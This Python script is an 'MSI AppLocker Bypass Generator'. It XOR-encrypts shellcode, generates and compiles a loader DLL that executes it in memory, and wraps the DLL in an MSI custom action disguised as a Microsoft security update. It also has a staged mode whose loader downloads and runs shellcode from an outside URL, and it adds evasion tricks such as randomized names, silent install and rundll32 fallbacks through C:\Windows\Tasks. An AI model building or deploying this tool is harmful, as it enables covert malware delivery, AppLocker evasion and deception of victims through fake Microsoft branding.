#!/usr/bin/env python3
"""
MSI AppLocker Bypass Generator
Wraps shellcode in a Windows Installer (.msi) package via custom action DLL.
Bypasses AppLocker default rules since msiexec.exe is a trusted system binary.

Flow: shellcode → XOR encrypt → loader DLL (MinGW) → MSI (wixl/msibuild)

Tries wixl first, then msibuild (msitools IDT tables). If neither is
available, outputs the loader DLL directly (usable via rundll32).

Usage:
  gen_msi.py -i beacon.bin -o payload.msi
  gen_msi.py -i beacon.bin -o payload.msi --name "KB5034441" --xor-key 0x3f
  gen_msi.py -i beacon.bin -o payload.dll --dll-only
  gen_msi.py --url http://10.10.14.5:8000/beacon.bin -o staged.msi
  gen_msi.py --url http://10.10.14.5:8000/beacon.bin -i beacon.bin -o staged.msi
"""

import argparse
import os
import random
import string
import subprocess
import sys
import tempfile
import uuid


def rand_name(length=8):
    return ''.join(random.choices(string.ascii_lowercase, k=length))


def rand_export():
    """Generate a plausible-looking DLL export name."""
    prefixes = [
        "Configure", "Initialize", "Setup", "Process", "Update",
        "Register", "Validate", "Execute", "Install", "Apply",
    ]
    suffixes = [
        "Component", "Module", "Package", "Service", "Resource",
        "Settings", "Config", "Handler", "Provider", "Manager",
    ]
    return random.choice(prefixes) + random.choice(suffixes)


def xor_encrypt(data, key):
    return bytes(b ^ key for b in data)


def generate_loader_c(shellcode_bytes, xor_key, export_name):
    """Generate C source for loader DLL with XOR-encrypted shellcode."""
    sc_hex = ', '.join(f'0x{b:02x}' for b in shellcode_bytes)

    v_buf = rand_name()
    v_old = rand_name()
    v_len = rand_name()
    v_sc = rand_name()
    v_i = rand_name()
    v_key = rand_name()
    v_thread = rand_name()
    junk_name = rand_name(10)
    junk_val = random.randint(1000, 9999)

    return f"""#include <windows.h>
#include <string.h>

typedef unsigned int MSIHANDLE;

static int {junk_name}(int x) {{ return x ^ {junk_val}; }}

static unsigned char {v_sc}[] = {{
{sc_hex}
}};

__declspec(dllexport) UINT __stdcall {export_name}(MSIHANDLE hInstall) {{
    DWORD {v_len} = sizeof({v_sc});
    unsigned char {v_key} = {hex(xor_key)};
    DWORD {v_i};

    for ({v_i} = 0; {v_i} < {v_len}; {v_i}++) {{
        {v_sc}[{v_i}] ^= {v_key};
    }}

    void *{v_buf} = VirtualAlloc(NULL, {v_len}, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!{v_buf}) return 1;

    memcpy({v_buf}, {v_sc}, {v_len});

    DWORD {v_old};
    VirtualProtect({v_buf}, {v_len}, PAGE_EXECUTE_READ, &{v_old});

    HANDLE {v_thread} = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE){v_buf}, NULL, 0, NULL);
    if ({v_thread}) {{
        WaitForSingleObject({v_thread}, INFINITE);
    }}

    return 0;
}}

BOOL WINAPI DllMain(HINSTANCE hDLL, DWORD dwReason, LPVOID lpReserved) {{
    return TRUE;
}}
"""


def generate_staged_loader_c(url, xor_key, export_name):
    """Generate C source for staged loader DLL that downloads shellcode from URL."""
    v_buf = rand_name()
    v_old = rand_name()
    v_len = rand_name()
    v_data = rand_name()
    v_i = rand_name()
    v_key = rand_name()
    v_thread = rand_name()
    v_session = rand_name()
    v_connect = rand_name()
    v_request = rand_name()
    v_size = rand_name()
    v_downloaded = rand_name()
    v_total = rand_name()
    v_tmp = rand_name()
    junk_name = rand_name(10)
    junk_val = random.randint(1000, 9999)

    # Parse URL for WinHTTP
    from urllib.parse import urlparse
    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    path = parsed.path or '/'
    use_https = 'WINHTTP_FLAG_SECURE' if parsed.scheme == 'https' else '0'

    return f"""#include <windows.h>
#include <winhttp.h>
#include <string.h>

#pragma comment(lib, "winhttp")

typedef unsigned int MSIHANDLE;

static int {junk_name}(int x) {{ return x ^ {junk_val}; }}

__declspec(dllexport) UINT __stdcall {export_name}(MSIHANDLE hInstall) {{
    unsigned char {v_key} = {hex(xor_key)};
    DWORD {v_size} = 0, {v_downloaded} = 0, {v_total} = 0;
    LPBYTE {v_data} = NULL, {v_tmp} = NULL;
    BYTE {v_buf}[8192];

    HINTERNET {v_session} = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!{v_session}) return 1;

    HINTERNET {v_connect} = WinHttpConnect({v_session}, L"{host}", {port}, 0);
    if (!{v_connect}) {{ WinHttpCloseHandle({v_session}); return 1; }}

    HINTERNET {v_request} = WinHttpOpenRequest({v_connect}, L"GET", L"{path}",
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, {use_https});
    if (!{v_request}) {{ WinHttpCloseHandle({v_connect}); WinHttpCloseHandle({v_session}); return 1; }}

    if (!WinHttpSendRequest({v_request}, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
        !WinHttpReceiveResponse({v_request}, NULL)) {{
        WinHttpCloseHandle({v_request});
        WinHttpCloseHandle({v_connect});
        WinHttpCloseHandle({v_session});
        return 1;
    }}

    while (WinHttpReadData({v_request}, {v_buf}, sizeof({v_buf}), &{v_downloaded}) && {v_downloaded} > 0) {{
        {v_tmp} = (LPBYTE)realloc({v_data}, {v_total} + {v_downloaded});
        if (!{v_tmp}) {{ free({v_data}); return 1; }}
        {v_data} = {v_tmp};
        memcpy({v_data} + {v_total}, {v_buf}, {v_downloaded});
        {v_total} += {v_downloaded};
        {v_downloaded} = 0;
    }}

    WinHttpCloseHandle({v_request});
    WinHttpCloseHandle({v_connect});
    WinHttpCloseHandle({v_session});

    if (!{v_data} || {v_total} == 0) return 1;

    DWORD {v_i};
    for ({v_i} = 0; {v_i} < {v_total}; {v_i}++) {{
        {v_data}[{v_i}] ^= {v_key};
    }}

    void *{v_len} = VirtualAlloc(NULL, {v_total}, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!{v_len}) {{ free({v_data}); return 1; }}

    memcpy({v_len}, {v_data}, {v_total});
    free({v_data});

    DWORD {v_old};
    VirtualProtect({v_len}, {v_total}, PAGE_EXECUTE_READ, &{v_old});

    HANDLE {v_thread} = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE){v_len}, NULL, 0, NULL);
    if ({v_thread}) {{
        WaitForSingleObject({v_thread}, INFINITE);
    }}

    return 0;
}}

BOOL WINAPI DllMain(HINSTANCE hDLL, DWORD dwReason, LPVOID lpReserved) {{
    return TRUE;
}}
"""


def generate_wix_xml(dll_path, export_name, product_name, msi_desc):
    """Generate WiX XML template for MSI with custom action."""
    product_guid = str(uuid.uuid4()).upper()
    upgrade_guid = str(uuid.uuid4()).upper()
    comp_guid = str(uuid.uuid4()).upper()

    return f"""<?xml version="1.0" encoding="utf-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="{product_guid}"
           Name="{product_name}"
           Language="1033"
           Version="1.0.0.0"
           Manufacturer="Microsoft Corporation"
           UpgradeCode="{upgrade_guid}">

    <Package InstallerVersion="200"
             Compressed="yes"
             InstallScope="perUser"
             Description="{msi_desc}"
             Comments="Windows Installer Package" />

    <MediaTemplate EmbedCab="yes" />

    <Binary Id="ActionDll" SourceFile="{dll_path}" />

    <CustomAction Id="RunAction"
                  BinaryKey="ActionDll"
                  DllEntry="{export_name}"
                  Execute="immediate"
                  Return="ignore" />

    <InstallExecuteSequence>
      <Custom Action="RunAction" After="InstallInitialize">
        NOT Installed
      </Custom>
    </InstallExecuteSequence>

    <Directory Id="TARGETDIR" Name="SourceDir">
      <Directory Id="TempFolder">
        <Component Id="EmptyComp" Guid="{comp_guid}">
          <CreateFolder />
        </Component>
      </Directory>
    </Directory>

    <Feature Id="Main" Title="Main" Level="1">
      <ComponentRef Id="EmptyComp" />
    </Feature>
  </Product>
</Wix>
"""


def find_tool(name):
    try:
        subprocess.run([name, '--version'], capture_output=True, timeout=5)
        return name
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass
    # Also try --help (msibuild doesn't have --version)
    try:
        subprocess.run([name, '--help'], capture_output=True, timeout=5)
        return name
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return None


def compile_dll(c_source, output_path, extra_libs=None):
    """Compile C source to Windows DLL using MinGW."""
    mingw = find_tool('x86_64-w64-mingw32-gcc')
    if not mingw:
        print("[!] MinGW (x86_64-w64-mingw32-gcc) not found")
        return False

    with tempfile.NamedTemporaryFile(suffix='.c', mode='w', delete=False) as f:
        f.write(c_source)
        c_path = f.name

    try:
        cmd = [
            mingw, '-shared', '-o', output_path, c_path,
            '-lkernel32', '-s', '-O2', '-Wl,--no-seh',
        ]
        if extra_libs:
            cmd.extend(extra_libs)
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        if result.returncode != 0:
            print(f"[!] DLL compile failed: {result.stderr}")
            return False
        return True
    finally:
        os.unlink(c_path)


def build_msi_wixl(dll_path, export_name, product_name, output_path):
    """Build MSI using wixl."""
    wixl = find_tool('wixl')
    if not wixl:
        return False

    with tempfile.NamedTemporaryFile(suffix='.wxs', mode='w', delete=False) as f:
        f.write(generate_wix_xml(dll_path, export_name, product_name,
                                 "System update package"))
        wxs_path = f.name

    try:
        result = subprocess.run(
            [wixl, '-o', output_path, wxs_path],
            capture_output=True, text=True, timeout=30
        )
        return result.returncode == 0
    finally:
        os.unlink(wxs_path)


def build_msi_msibuild(dll_path, export_name, product_name, output_path):
    """Build MSI using msibuild (msitools) with IDT table import."""
    msibuild = find_tool('msibuild')
    if not msibuild:
        return False

    product_guid = '{' + str(uuid.uuid4()).upper() + '}'
    upgrade_guid = '{' + str(uuid.uuid4()).upper() + '}'
    comp_guid = '{' + str(uuid.uuid4()).upper() + '}'
    package_guid = '{' + str(uuid.uuid4()).upper() + '}'

    with tempfile.TemporaryDirectory() as tmpdir:
        # msibuild v0 binary import expects file in <TableName>/ subdirectory
        bin_dir = os.path.join(tmpdir, 'Binary')
        os.makedirs(bin_dir)
        import shutil
        shutil.copy2(dll_path, os.path.join(bin_dir, 'loader.dll'))

        # IDT files (tab-delimited, CRLF line endings)
        idt = {}

        idt['_ForceCodepage'] = '\r\n\r\n1252\t_ForceCodepage\r\n'

        idt['Property'] = (
            'Property\tValue\r\n'
            's72\tl0\r\n'
            'Property\tProperty\r\n'
            f'ProductCode\t{product_guid}\r\n'
            'ProductLanguage\t1033\r\n'
            f'ProductName\t{product_name}\r\n'
            'ProductVersion\t1.0.0.0\r\n'
            'Manufacturer\tMicrosoft Corporation\r\n'
            f'UpgradeCode\t{upgrade_guid}\r\n'
        )

        idt['Directory'] = (
            'Directory\tDirectory_Parent\tDefaultDir\r\n'
            's72\tS72\tl255\r\n'
            'Directory\tDirectory\r\n'
            'TARGETDIR\t\tSourceDir\r\n'
        )

        idt['Component'] = (
            'Component\tComponentId\tDirectory_\tAttributes\tCondition\tKeyPath\r\n'
            's72\tS38\ts72\ti2\tS255\tS72\r\n'
            'Component\tComponent\r\n'
            f'EmptyComp\t{comp_guid}\tTARGETDIR\t0\t\t\r\n'
        )

        idt['Feature'] = (
            'Feature\tFeature_Parent\tTitle\tDescription\tDisplay\tLevel\tDirectory_\tAttributes\r\n'
            's38\tS38\tL64\tL255\tI2\ti2\tS72\ti2\r\n'
            'Feature\tFeature\r\n'
            'Main\t\tMain\t\t\t1\tTARGETDIR\t0\r\n'
        )

        idt['FeatureComponents'] = (
            'Feature_\tComponent_\r\n'
            's38\ts72\r\n'
            'FeatureComponents\tFeature_\tComponent_\r\n'
            'Main\tEmptyComp\r\n'
        )

        idt['Binary'] = (
            'Name\tData\r\n'
            's72\tv0\r\n'
            'Binary\tName\r\n'
            'ActionDll\tloader.dll\r\n'
        )

        # Type 65 = DLL in Binary table (1) + ignore return value (64)
        idt['CustomAction'] = (
            'Action\tType\tSource\tTarget\r\n'
            's72\ti2\tS72\tS255\r\n'
            'CustomAction\tAction\r\n'
            f'RunAction\t65\tActionDll\t{export_name}\r\n'
        )

        idt['InstallExecuteSequence'] = (
            'Action\tCondition\tSequence\r\n'
            's72\tS255\tI2\r\n'
            'InstallExecuteSequence\tAction\r\n'
            'CostInitialize\t\t800\r\n'
            'FileCost\t\t900\r\n'
            'CostFinalize\t\t1000\r\n'
            'InstallValidate\t\t1400\r\n'
            'InstallInitialize\t\t1500\r\n'
            'RunAction\tNOT Installed\t1501\r\n'
            'InstallFinalize\t\t6600\r\n'
        )

        # Write IDT files
        for name, content in idt.items():
            path = os.path.join(tmpdir, f'{name}.idt')
            with open(path, 'w', newline='') as f:
                f.write(content)

        # Remove existing output
        if os.path.exists(output_path):
            os.unlink(output_path)

        # Use absolute path for the MSI so it works from any CWD
        abs_output = os.path.abspath(output_path)

        # Set summary information
        result = subprocess.run(
            [msibuild, abs_output, '-s',
             product_name, 'Microsoft Corporation',
             'x64;1033', package_guid],
            capture_output=True, text=True, timeout=30,
            cwd=tmpdir
        )
        if result.returncode != 0:
            print(f"[!] msibuild -s failed: {result.stderr}")
            return False

        # Import tables in order (cwd=tmpdir so Binary/loader.dll resolves)
        table_order = [
            '_ForceCodepage', 'Property', 'Directory', 'Component',
            'Feature', 'FeatureComponents', 'Binary',
            'CustomAction', 'InstallExecuteSequence',
        ]

        for table in table_order:
            idt_path = f'{table}.idt'
            result = subprocess.run(
                [msibuild, abs_output, '-i', idt_path],
                capture_output=True, text=True, timeout=30,
                cwd=tmpdir
            )
            if result.returncode != 0:
                print(f"[!] msibuild import {table} failed: {result.stderr}")
                return False

        if not os.path.exists(abs_output) or os.path.getsize(abs_output) < 2048:
            return False

        return True


def build_msi_msfvenom(dll_path, export_name, output_path):
    """Build MSI using msfvenom with custom DLL payload."""
    msfvenom = None
    for p in ['msfvenom', '/usr/bin/msfvenom']:
        if find_tool(p):
            msfvenom = p
            break
    if not msfvenom:
        return False

    # Use msfvenom to create a base MSI, then replace the payload
    # Actually msfvenom can take a custom exe: -x flag doesn't work for MSI
    # Instead, use msfvenom's -f msi with custom payload from DLL
    # The cleanest approach: use msfvenom with exec payload that runs our DLL
    result = subprocess.run(
        [msfvenom, '-p', 'windows/x64/exec',
         f'CMD=rundll32.exe %TEMP%\\\\loader.dll,{export_name}',
         '-f', 'msi', '-o', output_path],
        capture_output=True, text=True, timeout=60
    )
    return result.returncode == 0


def _build_and_package(c_source, export_name, product_name, output_path, dll_only,
                       extra_libs=None):
    """Compile DLL from C source and package as MSI."""
    with tempfile.TemporaryDirectory() as tmpdir:
        dll_path = os.path.join(tmpdir, "loader.dll")

        if not compile_dll(c_source, dll_path, extra_libs=extra_libs):
            return False

        dll_size = os.path.getsize(dll_path)
        print(f"[+] Loader DLL: {dll_size} bytes")

        if dll_only:
            import shutil
            shutil.copy2(dll_path, output_path)
            print(f"[+] Generated: {output_path}")
            print(f"[*] Run: rundll32.exe {os.path.basename(output_path)},{export_name} 0")
            return True

        for builder_name, builder_fn in [
            ('wixl', lambda: build_msi_wixl(dll_path, export_name, product_name, output_path)),
            ('msibuild', lambda: build_msi_msibuild(dll_path, export_name, product_name, output_path)),
        ]:
            if builder_fn():
                msi_size = os.path.getsize(output_path)
                print(f"[+] Generated MSI ({builder_name}): {output_path} ({msi_size} bytes)")
                print(f"[*] Install: msiexec /i {os.path.basename(output_path)} /qn")
                return True

        print("[!] No MSI builder (wixl/msibuild) — generating DLL + rundll32 loader")
        dll_out = output_path.replace('.msi', '.dll')
        if dll_out == output_path:
            dll_out = output_path + '.dll'

        import shutil
        shutil.copy2(dll_path, dll_out)
        print(f"[+] Generated: {dll_out} ({dll_size} bytes)")
        print(f"[*] AppLocker bypass options:")
        print(f"    rundll32.exe {os.path.basename(dll_out)},{export_name} 0")
        print(f"    Copy to C:\\Windows\\Tasks\\ (writable trusted path)")
        return True


def generate(shellcode_path, output_path, product_name=None, xor_key=None,
             dll_only=False):
    """Generate MSI (or DLL) from shellcode file."""
    with open(shellcode_path, 'rb') as f:
        raw_sc = f.read()

    if not raw_sc:
        print("[!] Empty shellcode file")
        return False

    print(f"[*] Shellcode: {len(raw_sc)} bytes")

    if xor_key is None:
        xor_key = random.randint(0x01, 0xfe)
    print(f"[*] XOR key: 0x{xor_key:02x}")

    enc_sc = xor_encrypt(raw_sc, xor_key)
    export_name = rand_export()
    print(f"[*] DLL export: {export_name}")

    if not product_name:
        names = [
            "Windows Security Update", "System Configuration Tool",
            "Microsoft Visual C++ Redistributable", "Windows Defender Update",
            "Microsoft .NET Framework Update", "KB5034441 Security Update",
        ]
        product_name = random.choice(names)
    print(f"[*] MSI name: {product_name}")

    c_source = generate_loader_c(enc_sc, xor_key, export_name)
    return _build_and_package(c_source, export_name, product_name, output_path, dll_only)


def generate_staged(url, output_path, shellcode_path=None, product_name=None,
                    xor_key=None, dll_only=False):
    """Generate staged MSI that downloads XOR'd shellcode from URL at runtime.

    If shellcode_path is provided, XOR-encrypts and saves it alongside the MSI
    for serving via HTTP. The MSI DLL downloads from the URL at execution time.
    """
    if xor_key is None:
        xor_key = random.randint(0x01, 0xfe)
    print(f"[*] XOR key: 0x{xor_key:02x}")
    print(f"[*] Stage URL: {url}")

    export_name = rand_export()
    print(f"[*] DLL export: {export_name}")

    if not product_name:
        names = [
            "Windows Security Update", "System Configuration Tool",
            "Microsoft Visual C++ Redistributable", "Windows Defender Update",
            "Microsoft .NET Framework Update", "KB5034441 Security Update",
        ]
        product_name = random.choice(names)
    print(f"[*] MSI name: {product_name}")

    # If shellcode provided, encrypt and save for HTTP serving
    if shellcode_path:
        with open(shellcode_path, 'rb') as f:
            raw_sc = f.read()
        print(f"[*] Shellcode: {len(raw_sc)} bytes")
        enc_sc = xor_encrypt(raw_sc, xor_key)
        enc_path = os.path.splitext(output_path)[0] + '.bin'
        with open(enc_path, 'wb') as f:
            f.write(enc_sc)
        print(f"[+] Encrypted shellcode: {enc_path} ({len(enc_sc)} bytes)")
        print(f"[*] Serve: python3 -m http.server -d {os.path.dirname(enc_path)}")

    c_source = generate_staged_loader_c(url, xor_key, export_name)
    return _build_and_package(c_source, export_name, product_name, output_path, dll_only,
                              extra_libs=['-lwinhttp'])


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='MSI AppLocker Bypass Generator')
    parser.add_argument('-i', '--input', default=None,
                        help='Input shellcode file (.bin) — required unless --url is used')
    parser.add_argument('-o', '--output', required=True,
                        help='Output file path (.msi or .dll)')
    parser.add_argument('--url', default=None,
                        help='Staged mode: URL where XOR\'d shellcode will be served')
    parser.add_argument('--name', default=None,
                        help='MSI product name (default: random Windows-looking name)')
    parser.add_argument('--xor-key', type=lambda x: int(x, 0), default=None,
                        help='XOR encryption key (default: random)')
    parser.add_argument('--dll-only', action='store_true',
                        help='Output only the loader DLL (skip MSI packaging)')
    args = parser.parse_args()

    if args.url:
        # Staged mode: DLL downloads shellcode from URL at runtime
        if not generate_staged(args.url, args.output, shellcode_path=args.input,
                               product_name=args.name, xor_key=args.xor_key,
                               dll_only=args.dll_only):
            sys.exit(1)
    else:
        if not args.input:
            parser.error('-i/--input is required unless --url is used')
        if not generate(args.input, args.output, args.name, args.xor_key, args.dll_only):
            sys.exit(1)
